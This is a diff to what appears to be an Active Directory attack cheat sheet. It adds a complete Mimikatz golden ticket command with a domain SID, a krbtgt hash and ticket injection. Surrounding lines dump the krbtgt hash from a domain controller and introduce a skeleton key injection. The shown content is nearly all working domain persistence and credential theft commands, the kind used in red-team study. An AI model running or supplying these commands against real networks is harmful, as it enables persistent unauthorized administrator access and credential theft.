@@ -104,9 +104,11 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:subdomain.domain.local /sid:
 
 4.3 Domain Persistence: Golden Ticket
 
+Invoke-Mimikatz -Command '"kerberos::golden /User:Adminsitrator /domain:sub.domain.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt'
+
 Execute mimikatz on DC as DA to get krbtgt hash
 	Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc
-  
+ 
 4.4 Domain Persistence: Skeleton Key
 
 Inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
